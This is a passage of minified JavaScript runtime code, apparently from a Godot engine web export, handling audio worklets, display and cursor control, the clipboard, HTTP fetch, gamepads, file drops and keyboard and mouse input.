AudioContext",e),resolve()}))}};function _godot_audio_has_worklet(){return GodotAudio.ctx&&GodotAudio.ctx.audioWorklet?1:0}function _godot_audio_init(p_mix_rate,p_latency,p_state_change,p_latency_update){const statechange=GodotRuntime.get_func(p_state_change),latencyupdate=GodotRuntime.get_func(p_latency_update),mix_rate=GodotRuntime.getHeapValue(p_mix_rate,"i32"),channels=GodotAudio.init(mix_rate,p_latency,statechange,latencyupdate);return GodotRuntime.setHeapValue(p_mix_rate,GodotAudio.ctx.sampleRate,"i32"),channels}function _godot_audio_input_start(){return ENVIRONMENT_IS_PTHREAD?_emscripten_proxy_to_main_thread_js(49,1):GodotAudio.create_input((function(input){input.connect(GodotAudio.driver.get_node())}))}function _godot_audio_input_stop(){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(50,1);if(GodotAudio.input){const tracks=GodotAudio.input.mediaStream.getTracks();for(let i=0;i<tracks.length;i++)tracks[i].stop();GodotAudio.input.disconnect(),GodotAudio.input=null}}function _godot_audio_is_available(){return ENVIRONMENT_IS_PTHREAD?_emscripten_proxy_to_main_thread_js(51,1):window.AudioContext||window.webkitAudioContext?1:0}function _godot_audio_resume(){GodotAudio.ctx&&"running"!==GodotAudio.ctx.state&&GodotAudio.ctx.resume()}var GodotAudioWorklet={promise:null,worklet:null,ring_buffer:null,create:function(channels){const path=GodotConfig.locate_file("godot.audio.worklet.js");GodotAudioWorklet.promise=GodotAudio.ctx.audioWorklet.addModule(path).then((function(){return GodotAudioWorklet.worklet=new AudioWorkletNode(GodotAudio.ctx,"godot-processor",{outputChannelCount:[channels]}),Promise.resolve()})),GodotAudio.driver=GodotAudioWorklet},start:function(in_buf,out_buf,state){GodotAudioWorklet.promise.then((function(){const node=GodotAudioWorklet.worklet;node.connect(GodotAudio.ctx.destination),node.port.postMessage({cmd:"start",data:[state,in_buf,out_buf]}),node.port.onmessage=function(event){GodotRuntime.error(event.data)}}))},start_no_threads:function(p_out_buf,p_out_size,out_callback,p_in_buf,p_in_size,in_callback){GodotAudioWorklet.ring_buffer=new function RingBuffer(){let wpos=0,rpos=0,pending_samples=0;const wbuf=new Float32Array(p_out_size);this.receive=function(recv_buf){const buffer=GodotRuntime.heapSub(GROWABLE_HEAP_F32(),p_in_buf,p_in_size),from=rpos;let to_write=recv_buf.length,high=0;rpos+to_write>=p_in_size&&(high=p_in_size-rpos,buffer.set(recv_buf.subarray(0,high),rpos),to_write-=high,rpos=0),to_write&&buffer.set(recv_buf.subarray(high,to_write),rpos),in_callback(from,recv_buf.length),rpos+=to_write},this.consumed=function(size,port){pending_samples+=size,function send(port){if(0===pending_samples)return;const buffer=GodotRuntime.heapSub(GROWABLE_HEAP_F32(),p_out_buf,p_out_size),size=buffer.length,tot_sent=pending_samples;if(out_callback(wpos,pending_samples),wpos+pending_samples>=size){const high=size-wpos;wbuf.set(buffer.subarray(wpos,size)),pending_samples-=high,wpos=0}pending_samples>0&&wbuf.set(buffer.subarray(wpos,wpos+pending_samples),tot_sent-pending_samples),port.postMessage({cmd:"chunk",data:wbuf.subarray(0,tot_sent)}),wpos+=pending_samples,pending_samples=0}(port)}},GodotAudioWorklet.promise.then((function(){const node=GodotAudioWorklet.worklet,buffer=GodotRuntime.heapSlice(GROWABLE_HEAP_F32(),p_out_buf,p_out_size);node.connect(GodotAudio.ctx.destination),node.port.postMessage({cmd:"start_nothreads",data:[buffer,p_in_size]}),node.port.onmessage=function(event){if(GodotAudioWorklet.worklet)if("read"===event.data.cmd){const read=event.data.data;GodotAudioWorklet.ring_buffer.consumed(read,GodotAudioWorklet.worklet.port)}else if("input"===event.data.cmd){const buf=event.data.data;if(buf.length>p_in_size)return void GodotRuntime.error("Input chunk is too big");GodotAudioWorklet.ring_buffer.receive(buf)}else GodotRuntime.error(event.data)}}))},get_node:function(){return GodotAudioWorklet.worklet},close:function(){return new Promise((function(resolve,reject){if(null===GodotAudioWorklet.promise)return;GodotAudioWorklet.promise.then((function(){GodotAudioWorklet.worklet.port.postMessage({cmd:"stop",data:null}),GodotAudioWorklet.worklet.disconnect(),GodotAudioWorklet.worklet.port.onmessage=null,GodotAudioWorklet.worklet=null,GodotAudioWorklet.promise=null,resolve()})).catch((function(err){GodotRuntime.error(err)}))}))}};function _godot_audio_worklet_create(channels){try{GodotAudioWorklet.create(channels)}catch(e){return GodotRuntime.error("Error starting AudioDriverWorklet",e),1}return 0}function _godot_audio_worklet_start(p_in_buf,p_in_size,p_out_buf,p_out_size,p_state){const out_buffer=GodotRuntime.heapSub(GROWABLE_HEAP_F32(),p_out_buf,p_out_size),in_buffer=GodotRuntime.heapSub(GROWABLE_HEAP_F32(),p_in_buf,p_in_size),state=GodotRuntime.heapSub(GROWABLE_HEAP_I32(),p_state,4);GodotAudioWorklet.start(in_buffer,out_buffer,state)}function _godot_audio_worklet_state_add(p_state,p_idx,p_value){return Atomics.add(GROWABLE_HEAP_I32(),(p_state>>2)+p_idx,p_value)}function _godot_audio_worklet_state_get(p_state,p_idx){return Atomics.load(GROWABLE_HEAP_I32(),(p_state>>2)+p_idx)}function _godot_audio_worklet_state_wait(p_state,p_idx,p_expected,p_timeout){return Atomics.wait(GROWABLE_HEAP_I32(),(p_state>>2)+p_idx,p_expected,p_timeout),Atomics.load(GROWABLE_HEAP_I32(),(p_state>>2)+p_idx)}function _godot_js_config_canvas_id_get(p_ptr,p_ptr_max){GodotRuntime.stringToHeap(`#${GodotConfig.canvas.id}`,p_ptr,p_ptr_max)}function _godot_js_config_locale_get(p_ptr,p_ptr_max){GodotRuntime.stringToHeap(GodotConfig.locale,p_ptr,p_ptr_max)}var GodotDisplayCursor={shape:"default",visible:!0,cursors:{},set_style:function(style){GodotConfig.canvas.style.cursor=style},set_shape:function(shape){GodotDisplayCursor.shape=shape;let css=shape;if(shape in GodotDisplayCursor.cursors){const c=GodotDisplayCursor.cursors[shape];css=`url("${c.url}") ${c.x} ${c.y}, default`}GodotDisplayCursor.visible&&GodotDisplayCursor.set_style(css)},clear:function(){GodotDisplayCursor.set_style(""),GodotDisplayCursor.shape="default",GodotDisplayCursor.visible=!0,Object.keys(GodotDisplayCursor.cursors).forEach((function(key){URL.revokeObjectURL(GodotDisplayCursor.cursors[key]),delete GodotDisplayCursor.cursors[key]}))},lockPointer:function(){const canvas=GodotConfig.canvas;canvas.requestPointerLock&&canvas.requestPointerLock()},releasePointer:function(){document.exitPointerLock&&document.exitPointerLock()},isPointerLocked:function(){return document.pointerLockElement===GodotConfig.canvas}},GodotEventListeners={handlers:[],has:function(target,event,method,capture){return-1!==GodotEventListeners.handlers.findIndex((function(e){return e.target===target&&e.event===event&&e.method===method&&e.capture===capture}))},add:function(target,event,method,capture){GodotEventListeners.has(target,event,method,capture)||(GodotEventListeners.handlers.push(new function Handler(p_target,p_event,p_method,p_capture){this.target=p_target,this.event=p_event,this.method=p_method,this.capture=p_capture}(target,event,method,capture)),target.addEventListener(event,method,capture))},clear:function(){GodotEventListeners.handlers.forEach((function(h){h.target.removeEventListener(h.event,h.method,h.capture)})),GodotEventListeners.handlers.length=0}},GodotDisplayScreen={desired_size:[0,0],hidpi:!0,getPixelRatio:function(){return GodotDisplayScreen.hidpi&&window.devicePixelRatio||1},isFullscreen:function(){const elem=document.fullscreenElement||document.mozFullscreenElement||document.webkitFullscreenElement||document.msFullscreenElement;return elem?elem===GodotConfig.canvas:document.fullscreen||document.mozFullScreen||document.webkitIsFullscreen},hasFullscreen:function(){return document.fullscreenEnabled||document.mozFullScreenEnabled||document.webkitFullscreenEnabled},requestFullscreen:function(){if(!GodotDisplayScreen.hasFullscreen())return 1;const canvas=GodotConfig.canvas;try{const promise=(canvas.requestFullscreen||canvas.msRequestFullscreen||canvas.mozRequestFullScreen||canvas.mozRequestFullscreen||canvas.webkitRequestFullscreen).call(canvas);promise&&promise.catch((function(){}))}catch(e){return 1}return 0},exitFullscreen:function(){if(!GodotDisplayScreen.isFullscreen())return 0;try{const promise=document.exitFullscreen();promise&&promise.catch((function(){}))}catch(e){return 1}return 0},_updateGL:function(){const gl_context_handle=_emscripten_webgl_get_current_context(),gl=GL.getContext(gl_context_handle);gl&&GL.resizeOffscreenFramebuffer(gl)},updateSize:function(){const isFullscreen=GodotDisplayScreen.isFullscreen(),wantsFullWindow=2===GodotConfig.canvas_resize_policy,noResize=0===GodotConfig.canvas_resize_policy,wwidth=GodotDisplayScreen.desired_size[0],wheight=GodotDisplayScreen.desired_size[1],canvas=GodotConfig.canvas;let width=wwidth,height=wheight;if(noResize)return canvas.width!==width||canvas.height!==height?(GodotDisplayScreen.desired_size=[canvas.width,canvas.height],GodotDisplayScreen._updateGL(),1):0;const scale=GodotDisplayScreen.getPixelRatio();(isFullscreen||wantsFullWindow)&&(width=window.innerWidth*scale,height=window.innerHeight*scale);const csw=width/scale+"px",csh=height/scale+"px";return canvas.style.width!==csw||canvas.style.height!==csh||canvas.width!==width||canvas.height!==height?(canvas.width=width,canvas.height=height,canvas.style.width=csw,canvas.style.height=csh,GodotDisplayScreen._updateGL(),1):0}},GodotDisplayVK={textinput:null,textarea:null,available:function(){return GodotConfig.virtual_keyboard&&"ontouchstart"in window},init:function(input_cb){function create(what){const elem=document.createElement(what);return elem.style.display="none",elem.style.position="absolute",elem.style.zIndex="-1",elem.style.background="transparent",elem.style.padding="0px",elem.style.margin="0px",elem.style.overflow="hidden",elem.style.width="0px",elem.style.height="0px",elem.style.border="0px",elem.style.outline="none",elem.readonly=!0,elem.disabled=!0,GodotEventListeners.add(elem,"input",(function(evt){const c_str=GodotRuntime.allocString(elem.value);input_cb(c_str,elem.selectionEnd),GodotRuntime.free(c_str)}),!1),GodotEventListeners.add(elem,"blur",(function(evt){elem.style.display="none",elem.readonly=!0,elem.disabled=!0}),!1),GodotConfig.canvas.insertAdjacentElement("beforebegin",elem),elem}GodotDisplayVK.textinput=create("input"),GodotDisplayVK.textarea=create("textarea"),GodotDisplayVK.updateSize()},show:function(text,type,start,end){if(!GodotDisplayVK.textinput||!GodotDisplayVK.textarea)return;""===GodotDisplayVK.textinput.style.display&&""===GodotDisplayVK.textarea.style.display||GodotDisplayVK.hide(),GodotDisplayVK.updateSize();let elem=GodotDisplayVK.textinput;switch(type){case 0:default:elem.type="text",elem.inputmode="";break;case 1:elem=GodotDisplayVK.textarea;break;case 2:elem.type="text",elem.inputmode="numeric";break;case 3:elem.type="text",elem.inputmode="decimal";break;case 4:elem.type="tel",elem.inputmode="";break;case 5:elem.type="email",elem.inputmode="";break;case 6:elem.type="password",elem.inputmode="";break;case 7:elem.type="url",elem.inputmode=""}elem.readonly=!1,elem.disabled=!1,elem.value=text,elem.style.display="block",elem.focus(),elem.setSelectionRange(start,end)},hide:function(){GodotDisplayVK.textinput&&GodotDisplayVK.textarea&&[GodotDisplayVK.textinput,GodotDisplayVK.textarea].forEach((function(elem){elem.blur(),elem.style.display="none",elem.value=""}))},updateSize:function(){if(!GodotDisplayVK.textinput||!GodotDisplayVK.textarea)return;const rect=GodotConfig.canvas.getBoundingClientRect();function update(elem){elem.style.left=`${rect.left}px`,elem.style.top=`${rect.top}px`,elem.style.width=`${rect.width}px`,elem.style.height=`${rect.height}px`}update(GodotDisplayVK.textinput),update(GodotDisplayVK.textarea)},clear:function(){GodotDisplayVK.textinput&&(GodotDisplayVK.textinput.remove(),GodotDisplayVK.textinput=null),GodotDisplayVK.textarea&&(GodotDisplayVK.textarea.remove(),GodotDisplayVK.textarea=null)}},GodotDisplay={window_icon:"",getDPI:function(){const dpi=Math.round(96*window.devicePixelRatio);return dpi>=96?dpi:96}};function _godot_js_display_alert(p_text){window.alert(GodotRuntime.parseString(p_text))}function _godot_js_display_canvas_focus(){GodotConfig.canvas.focus()}function _godot_js_display_canvas_is_focused(){return document.activeElement===GodotConfig.canvas}function _godot_js_display_clipboard_get(callback){const func=GodotRuntime.get_func(callback);try{navigator.clipboard.readText().then((function(result){const ptr=GodotRuntime.allocString(result);func(ptr),GodotRuntime.free(ptr)})).catch((function(e){}))}catch(e){}}function _godot_js_display_clipboard_set(p_text){const text=GodotRuntime.parseString(p_text);return navigator.clipboard&&navigator.clipboard.writeText?(navigator.clipboard.writeText(text).catch((function(e){GodotRuntime.error("Setting OS clipboard is only possible from an input callback for the Web platform. Exception:",e)})),0):1}function _godot_js_display_cursor_is_hidden(){return!GodotDisplayCursor.visible}function _godot_js_display_cursor_is_locked(){return GodotDisplayCursor.isPointerLocked()?1:0}function _godot_js_display_cursor_lock_set(p_lock){p_lock?GodotDisplayCursor.lockPointer():GodotDisplayCursor.releasePointer()}function _godot_js_display_cursor_set_custom_shape(p_shape,p_ptr,p_len,p_hotspot_x,p_hotspot_y){const shape=GodotRuntime.parseString(p_shape),old_shape=GodotDisplayCursor.cursors[shape];if(p_len>0){const png=new Blob([GodotRuntime.heapSlice(GROWABLE_HEAP_U8(),p_ptr,p_len)],{type:"image/png"}),url=URL.createObjectURL(png);GodotDisplayCursor.cursors[shape]={url:url,x:p_hotspot_x,y:p_hotspot_y}}else delete GodotDisplayCursor.cursors[shape];shape===GodotDisplayCursor.shape&&GodotDisplayCursor.set_shape(GodotDisplayCursor.shape),old_shape&&URL.revokeObjectURL(old_shape.url)}function _godot_js_display_cursor_set_shape(p_string){GodotDisplayCursor.set_shape(GodotRuntime.parseString(p_string))}function _godot_js_display_cursor_set_visible(p_visible){const visible=0!==p_visible;visible!==GodotDisplayCursor.visible&&(GodotDisplayCursor.visible=visible,visible?GodotDisplayCursor.set_shape(GodotDisplayCursor.shape):GodotDisplayCursor.set_style("none"))}function _godot_js_display_desired_size_set(width,height){GodotDisplayScreen.desired_size=[width,height],GodotDisplayScreen.updateSize()}function _godot_js_display_fullscreen_cb(callback){const canvas=GodotConfig.canvas,func=GodotRuntime.get_func(callback);function change_cb(evt){evt.target===canvas&&func(GodotDisplayScreen.isFullscreen())}GodotEventListeners.add(document,"fullscreenchange",change_cb,!1),GodotEventListeners.add(document,"mozfullscreenchange",change_cb,!1),GodotEventListeners.add(document,"webkitfullscreenchange",change_cb,!1)}function _godot_js_display_fullscreen_exit(){return GodotDisplayScreen.exitFullscreen()}function _godot_js_display_fullscreen_request(){return GodotDisplayScreen.requestFullscreen()}function _godot_js_display_has_webgl(p_version){if(1!==p_version&&2!==p_version)return!1;try{return!!document.createElement("canvas").getContext(2===p_version?"webgl2":"webgl")}catch(e){}return!1}function _godot_js_display_is_swap_ok_cancel(){const plat=navigator.platform||"";return-1!==["Windows","Win64","Win32","WinCE"].indexOf(plat)?1:0}function _godot_js_display_notification_cb(callback,p_enter,p_exit,p_in,p_out){const canvas=GodotConfig.canvas,func=GodotRuntime.get_func(callback),notif=[p_enter,p_exit,p_in,p_out];["mouseover","mouseleave","focus","blur"].forEach((function(evt_name,idx){GodotEventListeners.add(canvas,evt_name,(function(){func(notif[idx])}),!0)}))}function _godot_js_display_pixel_ratio_get(){return GodotDisplayScreen.getPixelRatio()}function _godot_js_display_screen_dpi_get(){return GodotDisplay.getDPI()}function _godot_js_display_screen_size_get(width,height){const scale=GodotDisplayScreen.getPixelRatio();GodotRuntime.setHeapValue(width,window.screen.width*scale,"i32"),GodotRuntime.setHeapValue(height,window.screen.height*scale,"i32")}function _godot_js_display_setup_canvas(p_width,p_height,p_fullscreen,p_hidpi){const canvas=GodotConfig.canvas;switch(GodotEventListeners.add(canvas,"contextmenu",(function(ev){ev.preventDefault()}),!1),GodotEventListeners.add(canvas,"webglcontextlost",(function(ev){alert("WebGL context lost, please reload the page"),ev.preventDefault()}),!1),GodotDisplayScreen.hidpi=!!p_hidpi,GodotConfig.canvas_resize_policy){case 0:GodotDisplayScreen.desired_size=[canvas.width,canvas.height];break;case 1:GodotDisplayScreen.desired_size=[p_width,p_height];break;default:canvas.style.position="absolute",canvas.style.top=0,canvas.style.left=0}GodotDisplayScreen.updateSize(),p_fullscreen&&GodotDisplayScreen.requestFullscreen()}function _godot_js_display_size_update(){const updated=GodotDisplayScreen.updateSize();return updated&&GodotDisplayVK.updateSize(),updated}function _godot_js_display_touchscreen_is_available(){return"ontouchstart"in window}function _godot_js_display_tts_available(){return"speechSynthesis"in window}function _godot_js_display_vk_available(){return GodotDisplayVK.available()}function _godot_js_display_vk_cb(p_input_cb){const input_cb=GodotRuntime.get_func(p_input_cb);GodotDisplayVK.available()&&GodotDisplayVK.init(input_cb)}function _godot_js_display_vk_hide(){GodotDisplayVK.hide()}function _godot_js_display_vk_show(p_text,p_type,p_start,p_end){const text=GodotRuntime.parseString(p_text),start=p_start>0?p_start:0,end=p_end>0?p_end:start;GodotDisplayVK.show(text,p_type,start,end)}function _godot_js_display_window_blur_cb(callback){const func=GodotRuntime.get_func(callback);GodotEventListeners.add(window,"blur",(function(){func()}),!1)}function _godot_js_display_window_icon_set(p_ptr,p_len){let link=document.getElementById("-gd-engine-icon");null===link&&(link=document.createElement("link"),link.rel="icon",link.id="-gd-engine-icon",document.head.appendChild(link));const old_icon=GodotDisplay.window_icon,png=new Blob([GodotRuntime.heapSlice(GROWABLE_HEAP_U8(),p_ptr,p_len)],{type:"image/png"});GodotDisplay.window_icon=URL.createObjectURL(png),link.href=GodotDisplay.window_icon,old_icon&&URL.revokeObjectURL(old_icon)}function _godot_js_display_window_size_get(p_width,p_height){GodotRuntime.setHeapValue(p_width,GodotConfig.canvas.width,"i32"),GodotRuntime.setHeapValue(p_height,GodotConfig.canvas.height,"i32")}function _godot_js_display_window_title_set(p_data){document.title=GodotRuntime.parseString(p_data)}function _godot_js_eval(p_js,p_use_global_ctx,p_union_ptr,p_byte_arr,p_byte_arr_write,p_callback){const js_code=GodotRuntime.parseString(p_js);let eval_ret=null;try{if(p_use_global_ctx){const global_eval=eval;eval_ret=global_eval(js_code)}else eval_ret=eval(js_code)}catch(e){GodotRuntime.error(e)}switch(typeof eval_ret){case"boolean":return GodotRuntime.setHeapValue(p_union_ptr,eval_ret,"i32"),1;case"number":return GodotRuntime.setHeapValue(p_union_ptr,eval_ret,"double"),3;case"string":return GodotRuntime.setHeapValue(p_union_ptr,GodotRuntime.allocString(eval_ret),"*"),4;case"object":if(null===eval_ret)break;if(!ArrayBuffer.isView(eval_ret)||eval_ret instanceof Uint8Array?eval_ret instanceof ArrayBuffer&&(eval_ret=new Uint8Array(eval_ret)):eval_ret=new Uint8Array(eval_ret.buffer),eval_ret instanceof Uint8Array){const func=GodotRuntime.get_func(p_callback),bytes_ptr=func(p_byte_arr,p_byte_arr_write,eval_ret.length);return GROWABLE_HEAP_U8().set(eval_ret,bytes_ptr),20}}return 0}var IDHandler={_last_id:0,_references:{},get:function(p_id){return IDHandler._references[p_id]},add:function(p_data){const id=++IDHandler._last_id;return IDHandler._references[id]=p_data,id},remove:function(p_id){delete IDHandler._references[p_id]}},GodotFetch={onread:function(id,result){const obj=IDHandler.get(id);obj&&(result.value&&obj.chunks.push(result.value),obj.reading=!1,obj.done=result.done)},onresponse:function(id,response){const obj=IDHandler.get(id);if(!obj)return;let chunked=!1,bodySize=-1;response.headers.forEach((function(value,header){const v=value.toLowerCase().trim(),h=header.toLowerCase().trim();"transfer-encoding"===h&&"chunked"===v&&(chunked=!0),"content-length"===h&&(bodySize=parseInt(v,10))})),obj.status=response.status,obj.response=response,obj.reader=response.body.getReader(),obj.chunked=chunked,obj.bodySize=bodySize},onerror:function(id,err){GodotRuntime.error(err);const obj=IDHandler.get(id);obj&&(obj.error=err)},create:function(method,url,headers,body){const obj={request:null,response:null,reader:null,error:null,done:!1,reading:!1,status:0,chunks:[],bodySize:-1},id=IDHandler.add(obj),init={method:method,headers:headers,body:body};return obj.request=fetch(url,init),obj.request.then(GodotFetch.onresponse.bind(null,id)).catch(GodotFetch.onerror.bind(null,id)),id},free:function(id){const obj=IDHandler.get(id);obj&&(IDHandler.remove(id),obj.request&&obj.request.then((function(response){response.abort()})).catch((function(e){})))},read:function(id){const obj=IDHandler.get(id);if(obj&&obj.reader&&!obj.reading){if(obj.done)return void(obj.reader=null);obj.reading=!0,obj.reader.read().then(GodotFetch.onread.bind(null,id)).catch(GodotFetch.onerror.bind(null,id))}}};function _godot_js_fetch_body_length_get(p_id){const obj=IDHandler.get(p_id);return obj&&obj.response?obj.bodySize:-1}function _godot_js_fetch_create(p_method,p_url,p_headers,p_headers_size,p_body,p_body_size){const method=GodotRuntime.parseString(p_method),url=GodotRuntime.parseString(p_url),headers=GodotRuntime.parseStringArray(p_headers,p_headers_size),body=p_body_size?GodotRuntime.heapSlice(GROWABLE_HEAP_I8(),p_body,p_body_size):null;return GodotFetch.create(method,url,headers.map((function(hv){const idx=hv.indexOf(":");return idx<=0?[]:[hv.slice(0,idx).trim(),hv.slice(idx+1).trim()]})).filter((function(v){return 2===v.length})),body)}function _godot_js_fetch_free(id){GodotFetch.free(id)}function _godot_js_fetch_http_status_get(p_id){const obj=IDHandler.get(p_id);return obj&&obj.response?obj.status:0}function _godot_js_fetch_is_chunked(p_id){const obj=IDHandler.get(p_id);return obj&&obj.response?obj.chunked?1:0:-1}function _godot_js_fetch_read_chunk(p_id,p_buf,p_buf_size){const obj=IDHandler.get(p_id);if(!obj||!obj.response)return 0;let to_read=p_buf_size;const chunks=obj.chunks;for(;to_read&&chunks.length;){const chunk=obj.chunks[0];chunk.length>to_read?(GodotRuntime.heapCopy(GROWABLE_HEAP_I8(),chunk.slice(0,to_read),p_buf),chunks[0]=chunk.slice(to_read),to_read=0):(GodotRuntime.heapCopy(GROWABLE_HEAP_I8(),chunk,p_buf),to_read-=chunk.length,chunks.pop())}return chunks.length||GodotFetch.read(p_id),p_buf_size-to_read}function _godot_js_fetch_read_headers(p_id,p_parse_cb,p_ref){const obj=IDHandler.get(p_id);if(!obj||!obj.response)return 1;const cb=GodotRuntime.get_func(p_parse_cb),arr=[];obj.response.headers.forEach((function(v,h){arr.push(`${h}:${v}`)}));const c_ptr=GodotRuntime.allocStringArray(arr);return cb(arr.length,c_ptr,p_ref),GodotRuntime.freeStringArray(c_ptr,arr.length),0}function _godot_js_fetch_state_get(p_id){const obj=IDHandler.get(p_id);return obj?obj.error?-1:obj.response?obj.reader?1:obj.done?2:-1:0:-1}var GodotInputGamepads={samples:[],get_pads:function(){try{const pads=navigator.getGamepads();return pads||[]}catch(e){return[]}},get_samples:function(){return GodotInputGamepads.samples},get_sample:function(index){const samples=GodotInputGamepads.samples;return index<samples.length?samples[index]:null},sample:function(){const pads=GodotInputGamepads.get_pads(),samples=[];for(let i=0;i<pads.length;i++){const pad=pads[i];if(!pad){samples.push(null);continue}const s={standard:"standard"===pad.mapping,buttons:[],axes:[],connected:pad.connected};for(let b=0;b<pad.buttons.length;b++)s.buttons.push(pad.buttons[b].value);for(let a=0;a<pad.axes.length;a++)s.axes.push(pad.axes[a]);samples.push(s)}GodotInputGamepads.samples=samples},init:function(onchange){function add(pad){const guid=GodotInputGamepads.get_guid(pad),c_id=GodotRuntime.allocString(pad.id),c_guid=GodotRuntime.allocString(guid);onchange(pad.index,1,c_id,c_guid),GodotRuntime.free(c_id),GodotRuntime.free(c_guid)}GodotInputGamepads.samples=[];const pads=GodotInputGamepads.get_pads();for(let i=0;i<pads.length;i++)pads[i]&&add(pads[i]);GodotEventListeners.add(window,"gamepadconnected",(function(evt){evt.gamepad&&add(evt.gamepad)}),!1),GodotEventListeners.add(window,"gamepaddisconnected",(function(evt){evt.gamepad&&onchange(evt.gamepad.index,0)}),!1)},get_guid:function(pad){if(pad.mapping)return pad.mapping;const ua=navigator.userAgent;let os="Unknown";ua.indexOf("Android")>=0?os="Android":ua.indexOf("Linux")>=0?os="Linux":ua.indexOf("iPhone")>=0?os="iOS":ua.indexOf("Macintosh")>=0?os="MacOSX":ua.indexOf("Windows")>=0&&(os="Windows");const id=pad.id,exp1=/vendor: ([0-9a-f]{4}) product: ([0-9a-f]{4})/i,exp2=/^([0-9a-f]+)-([0-9a-f]+)-/i;let vendor="",product="";if(exp1.test(id)){const match=exp1.exec(id);vendor=match[1].padStart(4,"0"),product=match[2].padStart(4,"0")}else if(exp2.test(id)){const match=exp2.exec(id);vendor=match[1].padStart(4,"0"),product=match[2].padStart(4,"0")}return vendor&&product?os+vendor+product:`${os}Unknown`}},GodotInputDragDrop={promises:[],pending_files:[],add_entry:function(entry){entry.isDirectory?GodotInputDragDrop.add_dir(entry):entry.isFile?GodotInputDragDrop.add_file(entry):GodotRuntime.error("Unrecognized entry...",entry)},add_dir:function(entry){GodotInputDragDrop.promises.push(new Promise((function(resolve,reject){entry.createReader().readEntries((function(entries){for(let i=0;i<entries.length;i++)GodotInputDragDrop.add_entry(entries[i]);resolve()}))})))},add_file:function(entry){GodotInputDragDrop.promises.push(new Promise((function(resolve,reject){entry.file((function(file){const reader=new FileReader;reader.onload=function(){const f={path:file.relativePath||file.webkitRelativePath,name:file.name,type:file.type,size:file.size,data:reader.result};f.path||(f.path=f.name),GodotInputDragDrop.pending_files.push(f),resolve()},reader.onerror=function(){GodotRuntime.print("Error reading file"),reject()},reader.readAsArrayBuffer(file)}),(function(err){GodotRuntime.print("Error!"),reject()}))})))},process:function(resolve,reject){0!==GodotInputDragDrop.promises.length?GodotInputDragDrop.promises.pop().then((function(){setTimeout((function(){GodotInputDragDrop.process(resolve,reject)}),0)})):resolve()},_process_event:function(ev,callback){if(ev.preventDefault(),ev.dataTransfer.items)for(let i=0;i<ev.dataTransfer.items.length;i++){const item=ev.dataTransfer.items[i];let entry=null;"getAsEntry"in item?entry=item.getAsEntry():"webkitGetAsEntry"in item&&(entry=item.webkitGetAsEntry()),entry&&GodotInputDragDrop.add_entry(entry)}else GodotRuntime.error("File upload not supported");new Promise(GodotInputDragDrop.process).then((function(){const DROP=`/tmp/drop-${parseInt(Math.random()*(1<<30),10)}/`,drops=[],files=[];FS.mkdir(DROP.slice(0,-1)),GodotInputDragDrop.pending_files.forEach((elem=>{const path=elem.path;GodotFS.copy_to_fs(DROP+path,elem.data);let idx=path.indexOf("/");if(-1===idx)drops.push(DROP+path);else{const sub=path.substr(0,idx);idx=sub.indexOf("/"),idx<0&&-1===drops.indexOf(DROP+sub)&&drops.push(DROP+sub)}files.push(DROP+path)})),GodotInputDragDrop.promises=[],GodotInputDragDrop.pending_files=[],callback(drops),GodotConfig.persistent_drops?GodotOS.atexit((function(resolve,reject){GodotInputDragDrop.remove_drop(files,DROP),resolve()})):GodotInputDragDrop.remove_drop(files,DROP)}))},remove_drop:function(files,drop_path){const dirs=[drop_path.substr(0,drop_path.length-1)];files.forEach((function(file){FS.unlink(file);let dir=file.replace(drop_path,""),idx=dir.lastIndexOf("/");for(;idx>0;)dir=dir.substr(0,idx),-1===dirs.indexOf(drop_path+dir)&&dirs.push(drop_path+dir),idx=dir.lastIndexOf("/")})),dirs.sort((function(a,b){const al=(a.match(/\//g)||[]).length,bl=(b.match(/\//g)||[]).length;return al>bl?-1:al<bl?1:0})).forEach((function(dir){FS.rmdir(dir)}))},handler:function(callback){return function(ev){GodotInputDragDrop._process_event(ev,callback)}}},GodotInput={getModifiers:function(evt){return evt.shiftKey+0+(evt.altKey+0<<1)+(evt.ctrlKey+0<<2)+(evt.metaKey+0<<3)},computePosition:function(evt,rect){const canvas=GodotConfig.canvas,rw=canvas.width/rect.width,rh=canvas.height/rect.height;return[(evt.clientX-rect.x)*rw,(evt.clientY-rect.y)*rh]}};function _godot_js_input_drop_files_cb(callback){const func=GodotRuntime.get_func(callback),canvas=GodotConfig.canvas;GodotEventListeners.add(canvas,"dragover",(function(ev){ev.preventDefault()}),!1),GodotEventListeners.add(canvas,"drop",GodotInputDragDrop.handler((function(files){const args=files||[];if(!args.length)return;const argc=args.length,argv=GodotRuntime.allocStringArray(args);func(argv,argc),GodotRuntime.freeStringArray(argv,argc)})))}function _godot_js_input_gamepad_cb(change_cb){const onchange=GodotRuntime.get_func(change_cb);GodotInputGamepads.init(onchange)}function _godot_js_input_gamepad_sample(){return GodotInputGamepads.sample(),0}function _godot_js_input_gamepad_sample_count(){return GodotInputGamepads.get_samples().length}function _godot_js_input_gamepad_sample_get(p_index,r_btns,r_btns_num,r_axes,r_axes_num,r_standard){const sample=GodotInputGamepads.get_sample(p_index);if(!sample||!sample.connected)return 1;const btns=sample.buttons,btns_len=btns.length<16?btns.length:16;for(let i=0;i<btns_len;i++)GodotRuntime.setHeapValue(r_btns+(i<<2),btns[i],"float");GodotRuntime.setHeapValue(r_btns_num,btns_len,"i32");const axes=sample.axes,axes_len=axes.length<10?axes.length:10;for(let i=0;i<axes_len;i++)GodotRuntime.setHeapValue(r_axes+(i<<2),axes[i],"float");GodotRuntime.setHeapValue(r_axes_num,axes_len,"i32");const is_standard=sample.standard?1:0;return GodotRuntime.setHeapValue(r_standard,is_standard,"i32"),0}function _godot_js_input_key_cb(callback,code,key){const func=GodotRuntime.get_func(callback);function key_cb(pressed,evt){const modifiers=GodotInput.getModifiers(evt);GodotRuntime.stringToHeap(evt.code,code,32),GodotRuntime.stringToHeap(evt.key,key,32),func(pressed,evt.repeat,modifiers),evt.preventDefault()}GodotEventListeners.add(GodotConfig.canvas,"keydown",key_cb.bind(null,1),!1),GodotEventListeners.add(GodotConfig.canvas,"keyup",key_cb.bind(null,0),!1)}function _godot_js_input_mouse_button_cb(callback){const func=GodotRuntime.get_func(callback),canvas=GodotConfig.canvas;function button_cb(p_pressed,evt){const rect=canvas.getBoundingClientRect(),pos=GodotInput.computePosition(evt,rect),modifiers=GodotInput.getModifiers(evt);p_pressed&&GodotConfig.canvas.focus(),func(p_pressed,evt.button,pos[0],pos[1],modifiers)&&evt.preventDefault()}GodotEventListeners.add(canvas,"mousedown",button_cb.bind(null,1),!1),GodotEventListeners.add(window,"mouseup",button_cb.bind(null,0),!1)}function 